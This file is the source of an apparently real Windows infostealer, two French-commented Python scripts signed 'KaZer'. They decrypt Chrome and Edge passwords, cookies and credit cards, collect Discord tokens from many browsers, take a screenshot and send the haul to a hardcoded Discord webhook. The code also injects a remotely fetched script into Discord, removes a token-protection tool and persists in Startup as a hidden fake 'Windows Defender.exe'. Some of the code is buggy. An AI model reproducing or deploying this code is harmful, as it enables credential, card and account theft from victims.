import base64
import difflib
import json
import os
import sys
import winreg
from base64 import b64decode
from json import load, loads
from platform import platform
from re import findall, match
from shutil import copy2
from sqlite3 import connect
from subprocess import PIPE, Popen
from threading import Thread
from time import localtime, strftime
from urllib.request import urlopen
from zipfile import ZipFile

import psutil
import requests
import winshell
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from pyautogui import screenshot
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32crypt import CryptUnprotectData

WEBHOOK_URL = "&WEBHOOK_URL&"

def main(webhook_url):
    global webhook, embed

    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
    embed = Embed(title="👿 GRABBER BY KAZER 👿", color=15535980)
    
    get_loc()
    get_more()
    grabtokens()
    
    threads = []
    for thread in [
        Thread(target=ss),
        Thread(target=password),
        Thread(target=cookiemonster)
        ]:
        
        thread.start()
        threads.append(thread)
        
    for t in threads:
            t.join()
        
    embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
    embed.set_footer(text="👿 UNE NOUVELLE PERSONNE VIENT DE SE FAIRE CHOPPER BY KAZER 👿")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/972640655442587648/977964234619092992/3fc3wd5xwf171.jpg")

    zipup()
        
    file = None
    file = File(f'files-{os.getenv("UserName")}.zip')
    
    webhook.send(content="`👿 UNE NOUVELLE PERSONNE VIENT DE SE FAIRE CHOPPER BY KAZER 👿`", embed=embed, file=file, avatar_url="https://cdn.discordapp.com/attachments/972640655442587648/977964234619092992/3fc3wd5xwf171.jpg", username="👿 GRABBER BY KAZER 👿")
    
def kazer():
    for func in {
        main(WEBHOOK_URL), 
        cleanup(),
    }:
        try:
            func()
        except:
            pass

def accinfo():
    for t in int(tokens):
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers={"Authorization": tokens[t]})
            
        username = r.json()['username'] + '#' + r.json()['discriminator']
        phone = r.json()['phone']
        email = r.json()['email']
                
        embed.add_field(name="🔷 INFOS DISCORD 1", value=f"**```Nom d'utilisateur: {username}```** \n**```Téléphone: {phone}```** \n**```Email: {email}```**") 
    
def get_loc():
    ip = org = loc = city = country = region = googlemap = "None"
    try:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = load(response)
        ip = data['ip']
        org = data['org']
        loc = data['loc']
        city = data['city']
        country = data['country']
        region = data['region']
        googlemap = "https://www.google.com/maps/search/google+map++" + loc
        
        embed.add_field(name="📍 INFOS IRL", value=f"**```IP: {ip}```**\n**```ORG: {org}```** \n**```Localisation: [{loc}]```** \n**```Google Map: {googlemap}```**\n**```Cité: {city}```**\n**```Région: {region}```**\n**```Pays: {country}```**") 
    except:
        pass

def get_more():
    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

    cwd = os.getcwd()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    computer_os = platform()
    
    embed.add_field(name="👨‍💻 INFOS PC", value=f"**```OS: {computer_os}```** \n**```Utilisateur: {pc_username}```** \n**```Nom de l'ordinateur: {pc_name} ```**\n**```HWID: {gethwid()}```**") 
    
class grabtokens():
    def __init__(self):

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Peg_Grabber"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.discord_psw = []
        self.backup_codes = []
        
        self.grabTokens()
    
    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        config = tp+"config.json"
        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except Exception:
                pass 
        try:
            with open(config) as f:
                item = json.load(f)
                item['auto_start'] = True
                item['auto_start_discord'] = True
                item['integrity'] = True
                item['integrity_allowbetterdiscord'] = True
                item['integrity_checkexecutable'] = True
                item['integrity_checkhash'] = True
                item['integrity_checkmodule'] = True
                item['integrity_checkscripts'] = True
                item['integrity_checkresource'] = True
                item['integrity_redownloadhashes'] = True
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)


        except Exception:
            pass
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
        def strToInt(x):
            if isinstance(x, str):
                return ord(x)
            return x
        chars = 'BCDFGHJKMPQRTVWXY2346789'
        wkey = ''
        offset = 52
        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
        key = list(val)

        for i in range(24,-1, -1):
            temp = 0
            for j in range(14,-1,-1):
                temp *= 256
                try:
                    temp += strToInt(key[j+ offset])
                except IndexError:
                    return [productName, ""]
                if temp / 24 <= 255:
                    key[j+ offset] = temp/24
                else:
                    key[j+ offset] = 255
                temp = int(temp % 24)
            wkey = chars[temp] + wkey
        for i in range(5,len(wkey),6):
            wkey = wkey[:i] + '-' + wkey[i:]
        return [productName, wkey]
        
    def grabTokens(self):
        global token, tokens
        
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        
        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = None
                                token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                
                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
        
        for token in self.tokens:
            r = requests.get(
                'https://discord.com/api/v9/users/@me',
                headers={"Authorization": token})
                
            username = r.json()['username'] + '#' + r.json()['discriminator']
            phone = r.json()['phone']
            email = r.json()['email']
                    
            embed.add_field(name=f"🔷 INFOS DISCORD 2", value=f"**```Utilisateur: {username}```**\n**```Token: {token}```** \n**```Téléphone: {phone} ```**\n**```Email: {email}```**", inline=False)  

def ss():
    screenshot('screenshot.png')

class password():
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
        else:
            self.grabPassword()
            
        return
        
    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        master_key = self.get_master_key()
        with open("google-passwords.txt", "w") as f:
            f.write("Google Password by KaZer\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    with open("google-passwords.txt", "a") as f:
                        f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n")
        except:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

class cookiemonster:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.grabCookies()
    
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def grabCookies(self):
        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\Default\\Network\\cookies'
        try:
            copy2(login_db, "Loginvault.db")
        except Exception:
            pass
        conn = connect("Loginvault.db")
        cursor = conn.cursor()
        with open(".\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            f.write("Google Cokies by KaZer\n")
        with open(".\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:      
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    encrypted_cookie = r[2]
                    decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                    if host != "":
                        f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n")
            except Exception:
                pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception:
            pass
        
def zipup():
    with ZipFile(f'files-{os.getenv("UserName")}.zip', 'w') as zipf:
        zipf.write("google-passwords.txt")
        zipf.write("google-cookies.txt")
        zipf.write("screenshot.png")
        
def cleanup():
    for clean in [os.remove("google-passwords.txt"),
                  os.remove("google-cookies.txt"),
                  os.remove("screenshot.png"),
                  os.remove(f"files-{os.getenv('UserName')}.zip")]:

        try: clean()
        except: pass        

def inject(webhook_url):
    appdata = os.getenv("localappdata")
    for _dir in os.listdir(appdata):
        if 'discord' in _dir.lower():
            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
                if match(r'app-(\d*\.\d*)*', __dir):
                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
                    f = requests.get("https://raw.githubusercontent.com/KaZerDev/test/main/injection.js").text.replace("%WEBHOOK%", webhook_url)
                    modules_dir = os.listdir(abspath+'\\modules') 
                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                        indexFile.write(f)
                    os.startfile(abspath+os.sep+_dir+'.exe')

    def check_process(self):
        for process in self.blacklistedProcesses:
            if process in (p.name() for p in psutil.process_iter()):
                self.self_destruct()
        
    def get_ip(self):
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = load(response)
        ip = data['ip']
        
        if ip in self.blackListedIPS:
            return True
        
    def get_hwid(self):
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]       
        
        if hwid in self.blackListedHWIDS:
            return True
        
    def get_pcname(self):
        pc_name = os.getenv("COMPUTERNAME")
        
        if pc_name in self.blackListedPCNames:
            return True
        
    def get_username(self):
        pc_username = os.getenv("UserName")
        
        if pc_username in self.blackListedUsers:
            return True
        
    def self_destruct(self):
        os.system("del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__)))
        exit()

class startup:
    def __init__(self):
        self.fakename = "Windows Defender.exe"
        
        self.cwf = f"{os.getcwd()}\\{sys.argv[0].replace(os.getcwd(), '')}"
        self.dest_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\UsageLogTemp"
        self.startup_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        
        if self.skip(self.dest_path):
            return
        
        self.exists(self.dest_path)
        self.exists(self.startup_path)

        self.target = f"{self.dest_path}\{sys.argv[0].replace(os.getcwd(), '')}"
        
        self.mv_file(self.cwf, self.target)
        self.mk_shortcut(self.target, self.startup_path, self.fakename)
        self.ed_file(self.dest_path, self.fakename)
        
    def skip(self, path):
        if os.getcwd() == path:
            return True
          
    def exists(self, path):
        if not os.path.exists(path):
            os.makedirs(path)

    def mv_file(self, cwf, dest):
        os.rename(cwf, dest)
        
    def mk_shortcut(self, target, startup_path, fakename):
        winshell.CreateShortcut(Path=f"{startup_path}\{fakename.replace('.exe', '')}.lnk", Target=target)
    
    def ed_file(self, dest, fakename):
        
        os.rename(f"{dest}\\{sys.argv[0].replace(os.getcwd(), '')}", f"{dest}\\{fakename}")
        SetFileAttributes(f"{dest}\\{fakename}", FILE_ATTRIBUTE_HIDDEN)
                            
if __name__ == '__main__':
    if os.name != "nt":
        exit()
    
    kazer()

### 2EME CODE ###
import sys, os, re, json, ctypes, shutil, base64, sqlite3, zipfile, subprocess, cryptography
if sys.platform.startswith('linux'):
       exit()
    
else:
    pass


from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend



from dhooks import Webhook, File, Embed, Webhook
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from json import loads, dumps
from base64 import b64decode
from shutil import copyfile
from sys import argv

webhID = "977969207444656198"
webhAT = "MUKZ_92OXnTl2DNypEdYD1J1-OyMNCpuTnTK9voiV2TFmMSXnkzGmiAOfeeT4gQXpTqF"

http = "https"
disc = "discord"
webh = "webhooks"
appl = "api"
server = f"{http}://{disc}.com/{appl}/{webh}/{webhID}/{webhAT}"
hook = Webhook(f"{server}")


# VARIABLES
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chromepassword:
    def __init__(self):
        self.passwordList = []


    def chromedb(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = 'HOST: %s\nNAME: %s\nVALUE: %s\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)


    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass


    def saved(self):
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordList)


if __name__ == "__main__":
    main = chromepassword()
    try:
        main.chromedb()
    except:
        pass
    main.saved()

# PASSWORDS > .ZIP :
zname = r'C:\ProgramData\passwords.zip'
newzip = zipfile.ZipFile(zname, 'w')
newzip.write(r'C:\ProgramData\passwords.txt')
newzip.close()
passwords = File(r'C:\ProgramData\passwords.zip')


# SEND INFORMATION > REMOVE EVIDENCE :
hook.send("👿 UNE NOUVELLE PERSONNE VIENT DE SE FAIRE CHOPPER BY KAZER 👿", file=passwords)
os.remove(r'C:\ProgramData\passwords.txt')
os.remove(r'C:\ProgramData\passwords.zip')


# GOOGLE CHROME | CREDIT-CARDS :
def master():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        pass
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = ctypes.windll.crypt32.CryptUnprotectData(
        (master_key, None, None, None, 0)[1])
    return master_key


def dpayload(cipher, payload):
    return cipher.decrypt(payload)


def gcipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def dpassword(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = gcipher(master_key, iv)
        decrypted_pass = dpayload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        pass


def creditsteal():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    shutil.copy2(login_db,
                 "CCvault.db")
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
    except:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except:
        pass


# MICROSOFT EDGE | PASSWORD & CREDIT-CARDS :
def passwordsteal():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "Loginvault.db")
    except:
        pass
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hook.send(f"URL: " + url + "\nUSER: " + username +
                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except:
        pass

    cursor.close()
    conn.close()


def creditsteals():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "CCvault.db")
    except:
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        conn = sqlite3.connect("CCvault.db")
        cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
    except:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except:
        pass

def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def tokensteal():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'```PLATEFORME : {platform}```\n'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'```TOKEN : {token}```\n'
        else:
            pass

        message += ''

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(server, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

# WINDOW'S PRODUCT KEY :
def windows():
    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output(
            'wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output(
            'wmic os get Caption').decode().split('\n')[1].strip()

        if keys == '':
            keys = 'Pas valable'
        else:
            pass

        embed = Embed(
            title=f'INFORMATIONS',
            description=f'Utilisateur : {usr} \nType : {types} \nKey : {keys}\n',
            color=0x2f3136
        )
        hook.send(embed=embed)

    except:
        pass


def gotcha():
    while True:
        tokensteal()
        passwordsteal()
        creditsteal()
        creditsteals()
        windows()
        try:
            subprocess.os.system('del Loginvault.db')
        except:
            pass
        break


gotcha()
